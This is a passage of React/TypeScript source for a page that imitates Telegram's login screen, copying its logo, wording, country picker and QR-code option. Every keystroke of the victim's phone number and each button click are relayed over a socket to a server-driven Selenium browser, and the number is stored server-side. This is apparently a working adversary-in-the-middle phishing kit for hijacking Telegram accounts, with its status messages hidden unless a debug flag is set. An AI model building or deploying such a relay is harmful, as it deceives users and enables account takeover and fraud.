        timestamp: new Date().toISOString()
      });
      
      console.log('✅ NEXT button click event emitted successfully');
      
    } catch (error) {
      console.error('❌ Error in clickNextButton:', error);
      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsInputsReady(true);
      setIsSubmitting(false);
    }
  };


  // Function to handle phone number input changes (NO SYNC - just update state)
  const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newValue = e.target.value;
    console.log("handlePhoneNumberChange; newValue => ", newValue);
    
    console.log('handlePhoneNumberChange; 📱 Phone number input received:', {
      newValue,
      currentPhoneNumber: phoneNumber,
      selectedCountry: selectedCountry.dialCode
    });
    
    // Update the state with the corrected value
    setPhoneNumber(newValue);
    
    // REAL-TIME SYNC: Send to Selenium immediately for character-by-character sync
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 REAL-TIME SYNC: Sending to Selenium immediately:', newValue);
      
      socketRef.current.emit('syncInputToSelenium', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        value: newValue,
        timestamp: new Date().toISOString()
      });
      
      // Also send phone number to server for storage
      socketRef.current.emit('submitPhoneNumber', {
        sessionId: sessionIdRef.current,
        phoneNumber: newValue,
        timestamp: new Date().toISOString()
      });
      console.log('📱 Phone number sent to server for storage (real-time)');
      
      setSeleniumStatus('Phone number syncing in real-time...');
    }
    
  };

  // Function to filter countries based on search term
  const getFilteredCountries = () => {
    if (!countrySearchTerm.trim()) {
      return countries;
    }
    
    const searchLower = countrySearchTerm.toLowerCase();
    return countries.filter(country => 
      country.name.toLowerCase().startsWith(searchLower) ||
      country.dialCode.includes(searchLower) ||
      country.code.toLowerCase().startsWith(searchLower)
    );
  };

  // Function to handle country selection changes
  const handleCountrySelect = (country: Country) => {
    console.log('🌍 Country selected:', country);
    setSelectedCountry(country);
    setShowCountryDropdown(false);
    setCountrySearchTerm(''); // Clear search when country is selected
    
    // Update the input value directly
    if (countryInputRef.current) {
      countryInputRef.current.value = `${country.flag} ${country.name}`;
    }
    
    // Set phone number to country dial code with a space after it
    setPhoneNumber(country.dialCode + ' ');
    
    // NO COUNTRY SYNC - let Selenium handle its own country selection
    // Only sync the phone number input field
    console.log('🌍 Country changed to:', country.name, country.dialCode);
    console.log('🌍 Phone number updated to:', country.dialCode + ' ');
    
    // Sync the updated phone number (with country code) to Selenium
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      setTimeout(() => {
        console.log('📱 Syncing updated phone number after country change:', country.dialCode + ' ');
        socketRef.current?.emit('syncInputToSelenium', {
          sessionId: sessionIdRef.current,
          inputType: 'phoneNumber',
          value: country.dialCode + ' ', // Send country code + space
          timestamp: new Date().toISOString()
        });
      }, 500); // Short delay to ensure country change is processed
    }
  };

  const goBackToQrCode = () => {
    // Check if QR code button is found in Selenium window
    if (!qrCodeButtonFound) {
      setSeleniumStatus('Please wait for QR code button to be ready...');
      return;
    }

    // Prevent multiple rapid clicks
    if (isQrCodeButtonLoading) {
      return;
    }

    try {
      setIsQrCodeButtonLoading(true);
      setSeleniumStatus('Initiating QR code return...');
      
      // Send message to Selenium server to click the QR code button
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        socketRef.current.emit('clickNextButton', {
          sessionId: sessionIdRef.current,
          selector: 'div#auth-phone-number-form form button',
          timestamp: new Date().toISOString()
        });
        
        console.log('✅ QR code return request sent to Selenium server');
      }
      
      // Navigate back to the main page
      navigate('/');
    } catch (error) {
      console.error('❌ Error in goBackToQrCode:', error);
      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsQrCodeButtonLoading(false);
    }
  };

  // Function to fix country and phone number sync issues
  // Function to fix phone number sync issues (NO COUNTRY SYNC)
  const fixCountryAndPhoneSync = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔧 Fixing phone number synchronization (no country sync)...');
      
      // Only sync the phone number - let Selenium handle its own country
      console.log('📱 Syncing phone number to Selenium:', phoneNumber);
      
      socketRef.current.emit('syncInputToSelenium', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        value: phoneNumber, // Send FULL value with country code
        timestamp: new Date().toISOString()
      });
      
      setSeleniumStatus('Phone number sync completed (country not synced)');
    }
  };

  // Add debugging for phoneNumber state changes
  useEffect(() => {
    console.log('📱 Phone number state changed to:', phoneNumber);
    console.log('📱 Selected country:', selectedCountry.name, selectedCountry.dialCode);
  }, [phoneNumber, selectedCountry]);

  // Update input value when country changes
  useEffect(() => {
    if (countryInputRef.current && !countrySearchTerm) {
      countryInputRef.current.value = `${selectedCountry.flag} ${selectedCountry.name}`;
    }
  }, [selectedCountry, countrySearchTerm]);

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as Element;
      if (showCountryDropdown && !target.closest('.country-dropdown-container')) {
        console.log('🖱️ Click outside detected, closing dropdown');
        setShowCountryDropdown(false);
        setCountrySearchTerm('');
      }
    };

    // Use click instead of mousedown to avoid interfering with country selection
    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, [showCountryDropdown]);

  // Function to detect user's country based on IP address (like Telegram does)
  const detectUserCountry = async () => {
    console.log('🌍 Detecting user country based on IP address...');
    
    try {
      // Try completely free IP geolocation APIs (no API keys needed)
      let response = await fetch('https://ipapi.co/json/');
      
      if (!response.ok) {
        // Fallback to alternative free API
        console.log('🔄 Primary API failed, trying fallback...');
        response = await fetch('https://ipinfo.io/json');
      }
      
      if (!response.ok) {
        // Second fallback
        console.log('🔄 Second API failed, trying third fallback...');
        response = await fetch('https://api.myip.com');
      }
      
      if (response.ok) {
        const data = await response.json();
        console.log('🌍 IP geolocation result:', data);
        
        // Handle different API response formats
        const detectedCountry = data.country_name || data.country || data.countryName || data.country_name_eng;
        const detectedCountryCode = data.country_code || data.country_code_iso3 || data.countryCode || data.country_code_iso2;
        
        console.log('🌍 Detected country from IP:', detectedCountry, detectedCountryCode);
        
        // Find matching country in our list
        const matchedCountry = countries.find(country => 
          country.name === detectedCountry || 
          country.code === detectedCountryCode ||
          country.name.toLowerCase().includes(detectedCountry?.toLowerCase() || '') ||
          detectedCountry?.toLowerCase().includes(country.name.toLowerCase()) ||
          // Also try matching by common variations
          country.name.toLowerCase().includes('united states') && detectedCountry?.toLowerCase().includes('usa') ||
          country.name.toLowerCase().includes('united kingdom') && detectedCountry?.toLowerCase().includes('uk')
        );
        
        if (matchedCountry) {
          console.log('🌍 ✅ Found matching country:', matchedCountry.name, matchedCountry.dialCode);
          
          // Update the selected country
          setSelectedCountry(matchedCountry);
          
          // Set the phone number to the dial code
          console.log('📱 Setting initial phone number to detected country dial code:', matchedCountry.dialCode);
          setPhoneNumber(matchedCountry.dialCode + ' ');
          
          // Update status
          setSeleniumStatus(`Country auto-detected: ${matchedCountry.name} - dial code set to ${matchedCountry.dialCode}`);
          
          // Sync to Selenium if connected
          if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
            console.log('🔄 Syncing auto-detected country to Selenium');
            socketRef.current.emit('syncCountryToSelenium', {
              sessionId: sessionIdRef.current,
              country: matchedCountry.name,
              dialCode: matchedCountry.dialCode,
              timestamp: new Date().toISOString()
            });
          }
        } else {
          console.log('🌍 ❌ No matching country found for:', detectedCountry);
          console.log('🌍 Available countries:', countries.map(c => c.name));
          
          // Try browser locale as fallback
          console.log('🔄 Trying browser locale fallback...');
          const browserCountry = detectCountryFromBrowser();
          if (browserCountry) {
            setSelectedCountry(browserCountry);
            setPhoneNumber(browserCountry.dialCode + ' ');
            setSeleniumStatus(`Country detected from browser: ${browserCountry.name} - dial code set to ${browserCountry.dialCode}`);
          } else {
            // Final fallback to default country (Finland)
            const defaultCountry = countries.find(c => c.name === 'Finland') || countries[0];
            console.log('🌍 Using fallback country:', defaultCountry.name, defaultCountry.dialCode);
            
            setSelectedCountry(defaultCountry);
            setPhoneNumber(defaultCountry.dialCode + ' ');
            setSeleniumStatus(`Using default country: ${defaultCountry.name} - dial code set to ${defaultCountry.dialCode}`);
          }
        }
      } else {
        console.log('❌ All IP geolocation APIs failed, trying browser locale...');
        const browserCountry = detectCountryFromBrowser();
        if (browserCountry) {
          setSelectedCountry(browserCountry);
          setPhoneNumber(browserCountry.dialCode + ' ');
          setSeleniumStatus(`Country detected from browser: ${browserCountry.name} - dial code set to ${browserCountry.dialCode}`);
        } else {
          throw new Error('All detection methods failed');
        }
      }
    } catch (error) {
      console.log('❌ Error in IP geolocation:', error);
      
      // Try browser locale as final fallback
      console.log('🔄 Trying browser locale as final fallback...');
      const browserCountry = detectCountryFromBrowser();
      if (browserCountry) {
        setSelectedCountry(browserCountry);
        setPhoneNumber(browserCountry.dialCode + ' ');
        setSeleniumStatus(`Country detected from browser: ${browserCountry.name} - dial code set to ${browserCountry.dialCode}`);
      } else {
        // Final fallback to default country (Finland)
        const defaultCountry = countries.find(c => c.name === 'Finland') || countries[0];
        console.log('🌍 Using fallback country due to error:', defaultCountry.name, defaultCountry.dialCode);
        
        setSelectedCountry(defaultCountry);
        setPhoneNumber(defaultCountry.dialCode + ' ');
        setSeleniumStatus(`Using default country: ${defaultCountry.name} - dial code set to ${defaultCountry.dialCode}`);
      }
    }
  };

  // Fallback function to detect country from browser locale (no external APIs needed)
  const detectCountryFromBrowser = () => {
    try {
      const locale = navigator.language;
      console.log('🌍 Browser locale:', locale);
      
      // Extract country code from locale (e.g., "en-US" -> "US")
      const countryCode = locale.split('-')[1] || locale.split('_')[1];
      if (countryCode) {
        console.log('🌍 Extracted country code from locale:', countryCode);
        
        // Find country by code
        const matchedCountry = countries.find(country => 
          country.code === countryCode || 
          country.code === countryCode.toUpperCase()
        );
        
        if (matchedCountry) {
          console.log('🌍 ✅ Found country from browser locale:', matchedCountry.name, matchedCountry.dialCode);
          return matchedCountry;
        }
      }
      
      // Try to match by language (e.g., "en" -> English-speaking countries)
      const language = locale.split('-')[0] || locale.split('_')[0];
      if (language) {
        console.log('🌍 Trying to match by language:', language);
        
        // Common language to country mappings
        const languageMap: Record<string, string[]> = {
          'en': ['United States', 'United Kingdom', 'Canada', 'Australia'],
          'de': ['Germany', 'Austria', 'Switzerland'],
          'fr': ['France', 'Canada', 'Switzerland'],
          'es': ['Spain', 'Mexico', 'Argentina'],
          'it': ['Italy', 'Switzerland'],
          'pt': ['Portugal', 'Brazil'],
          'ru': ['Russia'],
          'ja': ['Japan'],
          'ko': ['South Korea'],
          'zh': ['China'],
          'ar': ['Saudi Arabia', 'Egypt', 'Algeria'],
          'hi': ['India'],
          'tr': ['Turkey']
        };
        
        const possibleCountries = languageMap[language] || [];
        for (const countryName of possibleCountries) {
          const matchedCountry = countries.find(c => c.name === countryName);
          if (matchedCountry) {
            console.log('🌍 ✅ Found country from language mapping:', matchedCountry.name, matchedCountry.dialCode);
            return matchedCountry;
          }
        }
      }
      
      console.log('🌍 ❌ No country found from browser locale');
      return null;
    } catch (error) {
      console.log('❌ Error detecting country from browser locale:', error);
      return null;
    }
  };

  // Initialize country detection and phone number setup when component mounts
  useEffect(() => {
    console.log('🚀 Component mounted, initializing country detection...');
    
    // Only initialize and detect country if we don't have a phone number from URL
    if (!phoneNumberFromUrl && countries.length > 0) {
      setPhoneNumber(countries[0].dialCode + ' ');
      detectUserCountry();
    } else if (phoneNumberFromUrl) {
      console.log('📞 Phone number from URL detected, skipping country detection to preserve user selection');
    }
  }, [phoneNumberFromUrl]); // Run when phoneNumberFromUrl changes

  // Function to check if Selenium session is actually active
  const checkSeleniumSessionStatus = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking Selenium session status...');
      socketRef.current.emit('checkSessionStatus', {
        sessionId: sessionIdRef.current,
        timestamp: new Date().toISOString()
      });
      
      // Also trigger an auto-sync to fix any phone number mismatches
      setTimeout(() => {
        if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
          console.log('🔧 Auto-syncing phone number after session check...');
          fixCountryAndPhoneSync();
        }
      }, 2000); // Wait 2 seconds for session status to be received
    }
  };

  return (
    <Page back={true}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px 20px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Login Content Container */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          {/* Telegram Logo */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center'
          }}>
            <img 
              src="/telegram-logo.svg" 
              alt="Telegram" 
              style={{
                width: '160px',
                height: '160px',
                marginBottom: '16px'
              }}
            />
            <h1 style={{
              fontSize: '24px',
              color: '#000',
              margin: '0',
              fontWeight: '600',
              letterSpacing: '-0.02em'
            }}>
              Telegram
            </h1>
          </div>

          {/* Instructions */}
          <p style={{
            fontSize: '16px',
            color: '#666',
            textAlign: 'center',
            margin: '0 0 32px 0',
            lineHeight: '1.4',
            maxWidth: '360px'
          }}>
            Please confirm your country code and enter your phone number.
          </p>

          {/* Phone Number Form */}
          <form onSubmit={handleSubmit} style={{
            width: '100%',
            maxWidth: '360px'
          }}>
            {/* Country Selection */}
            <div style={{
              marginBottom: '20px',
              position: 'relative'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                marginBottom: '8px'
              }}>
                <label style={{
                  fontSize: '14px',
                  color: '#666',
                  fontWeight: '500'
                }}>
                  Country
                </label>
              </div>
              
              <div 
                className="country-dropdown-container"
                style={{
                  border: '1px solid #e1e8ed',
                  borderRadius: '8px',
                  padding: '0 16px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  backgroundColor: 'white',
                  transition: 'border-color 0.2s',
                  height: '48px',
                  boxSizing: 'border-box',
                  position: 'relative'
                }}
              onMouseEnter={(e) => e.currentTarget.style.borderColor = '#0088cc'}
              onMouseLeave={(e) => e.currentTarget.style.borderColor = '#e1e8ed'}
            >
              <input
                ref={countryInputRef}
                type="text"
                defaultValue={countrySearchTerm || `${selectedCountry.flag} ${selectedCountry.name}`}
                onChange={(e) => {
                  const newValue = e.target.value;
                  setCountrySearchTerm(newValue);
                  setShowCountryDropdown(true); // Show dropdown when typing
                }}
                onFocus={(e) => {
                  setShowCountryDropdown(true);
                  // Select all text when focusing (like Telegram)
                  setTimeout(() => {
                    e.target.select();
                  }, 0);
                }}
                placeholder="Search countries..."
                style={{
                  flex: 1,
                  border: 'none',
                  outline: 'none',
                  fontSize: '16px',
                  color: '#333',
                  backgroundColor: 'transparent',
                  padding: '0',
                  margin: '0',
                  minWidth: '0'
                }}
              />
              <svg 
                width="16" 
                height="16" 
                viewBox="0 0 24 24" 
                fill="none"
                style={{
                  transform: showCountryDropdown ? 'rotate(180deg)' : 'rotate(0deg)',
                  transition: 'transform 0.2s',
                  cursor: 'pointer',
                  flexShrink: 0
                }}
                onClick={() => setShowCountryDropdown(!showCountryDropdown)}
              >
                <path d="M7 10l5 5 5-5" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>

              {/* Country Dropdown */}
              {showCountryDropdown && (
                <div style={{
                  position: 'absolute',
                  top: '100%',
                  left: 0,
                  right: 0,
                  backgroundColor: 'rgba(255, 255, 255, 0.95)',
                  backdropFilter: 'blur(10px)',
                  border: '1px solid #e1e8ed',
                  borderRadius: '8px',
                  maxHeight: '300px',
                  overflowY: 'auto',
                  zIndex: 1000,
                  boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
                }}>
                  {/* Country List */}
                  {getFilteredCountries().length > 0 ? (
                    getFilteredCountries().map((country) => (
                      <div
                        key={country.code}
                        onClick={(e) => {
                          console.log('🖱️ Country clicked:', country.name, 'Event:', e);
                          e.preventDefault();
                          e.stopPropagation();
                          console.log('🖱️ About to call handleCountrySelect');
                          handleCountrySelect(country);
                          console.log('🖱️ handleCountrySelect called');
                        }}
                        onMouseDown={(e) => {
                          console.log('🖱️ Country mousedown:', country.name);
                          e.preventDefault();
                          e.stopPropagation();
                        }}
                        style={{
                          padding: '6px 16px',
                          cursor: 'pointer',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'space-between',
                          transition: 'background-color 0.2s',
                          height: '32px',
                          position: 'relative',
                          zIndex: 10
                        }}
                        onMouseEnter={(e) => e.currentTarget.style.backgroundColor = 'rgba(248, 249, 250, 0.8)'}
                        onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
                      >
                        <div 
                          style={{
                            display: 'flex',
                            alignItems: 'center',
                            gap: '12px'
                          }}
                          onClick={(e) => {
                            console.log('🖱️ Inner div clicked:', country.name);
                            e.preventDefault();
                            e.stopPropagation();
                            handleCountrySelect(country);
                          }}
                        >
                          <span 
                            style={{ fontSize: '18px' }}
                            onClick={(e) => {
                              console.log('🖱️ Flag clicked:', country.name);
                              e.preventDefault();
                              e.stopPropagation();
                              handleCountrySelect(country);
                            }}
                          >{country.flag}</span>
                          <span 
                            style={{ fontSize: '16px', color: '#333' }}
                            onClick={(e) => {
                              console.log('🖱️ Country name clicked:', country.name);
                              e.preventDefault();
                              e.stopPropagation();
                              handleCountrySelect(country);
                            }}
                          >{country.name}</span>
                        </div>
                        <span 
                          style={{ fontSize: '14px', color: '#666' }}
                          onClick={(e) => {
                            console.log('🖱️ Dial code clicked:', country.name);
                            e.preventDefault();
                            e.stopPropagation();
                            handleCountrySelect(country);
                          }}
                        >{country.dialCode}</span>
                      </div>
                    ))
                  ) : (
                    <div style={{
                      padding: '20px 16px',
                      textAlign: 'center',
                      color: '#666',
                      fontSize: '14px'
                    }}>
                      No countries found for "{countrySearchTerm}"
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Phone Number Input */}
            <div style={{
              marginBottom: '24px'
            }}>
              <div style={{
                border: '1px solid #e1e8ed',
                borderRadius: '8px',
                overflow: 'visible',
                height: '48px',
                boxSizing: 'border-box',
                position: 'relative'
              }}>
                <label style={{
                  position: 'absolute',
                  top: '-8px',
                  left: '12px',
                  fontSize: '14px',
                  color: '#666',
                  backgroundColor: 'white',
                  padding: '0 4px',
                  fontWeight: '500',
                  zIndex: 1
                }}>
                  Your phone number
                </label>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={handlePhoneNumberChange}
                  // onKeyDown={handlePhoneNumberKeyDown}
                  placeholder={`${selectedCountry.dialCode} Enter your phone number`}
                  style={{
                    width: '100%',
                    height: '48px',
                    padding: '0 16px',
                    border: 'none',
                    outline: 'none',
                    fontSize: '16px',
                    color: '#333',
                    boxSizing: 'border-box',
                    borderRadius: '8px',
                    backgroundColor: 'transparent',
                    cursor: 'text'
                  }}
                />
              </div>

            </div>

            {/* Keep Signed In Checkbox */}
            <div style={{
              marginBottom: '32px',
              display: 'flex',
              alignItems: 'center',
              gap: '12px'
            }}>
              <input
                type="checkbox"
                id="keepSignedIn"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                style={{
                  width: '18px',
                  height: '18px',
                  accentColor: '#0088cc'
                }}
              />
              <label 
                htmlFor="keepSignedIn"
                style={{
                  fontSize: '16px',
                  color: '#333',
                  cursor: 'pointer'
                }}
              >
                Keep me signed in
              </label>
            </div>

            {/* Submit Button */}
            <StyledSubmitButton
              type="submit"
              disabled={!isInputsReady || isSubmitting}
              $isEnabled={isInputsReady && !isSubmitting}
            >
              {isSubmitting ? 'Please wait...' : (isInputsReady ? 'NEXT' : (import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'Waiting for inputs...' : 'NEXT'))}
            </StyledSubmitButton>
          </form>

          {/* QR Code Login Link */}
          <div style={{
            marginTop: '32px',
            textAlign: 'center'
          }}>
            <button
              onClick={goBackToQrCode}
              disabled={!qrCodeButtonFound || isQrCodeButtonLoading}
              style={{
                background: qrCodeButtonFound && !isQrCodeButtonLoading ? 'none' : '#f5f5f5',
                border: 'none',
                color: qrCodeButtonFound && !isQrCodeButtonLoading ? '#0088cc' : '#999',
                fontSize: '16px',
                cursor: qrCodeButtonFound && !isQrCodeButtonLoading ? 'pointer' : 'not-allowed',
                textDecoration: 'none',
                padding: '8px 16px',
                borderRadius: '4px',
                transition: 'background-color 0.2s',
                opacity: qrCodeButtonFound && !isQrCodeButtonLoading ? 1 : 0.6
              }}
              onMouseOver={(e) => {
                if (qrCodeButtonFound && !isQrCodeButtonLoading) {
                  e.currentTarget.style.backgroundColor = '#f0f8ff';
                }
              }}
              onMouseOut={(e) => {
                if (qrCodeButtonFound && !isQrCodeButtonLoading) {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }
              }}
            >
              {isQrCodeButtonLoading ? 'Returning...' : 
               qrCodeButtonFound ? 'LOG IN BY QR CODE' : (import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'WAITING FOR QR CODE BUTTON...' : 'LOG IN BY QR CODE')}
            </button>
            {/* <p style={{
              fontSize: '14px',
              color: '#666',
              marginTop: '8px',
              textAlign: 'center'
            }}>
              {seleniumStatus}
            </p> */}
          </div>
        </div>
      </div>
    </Page>
  );
}; 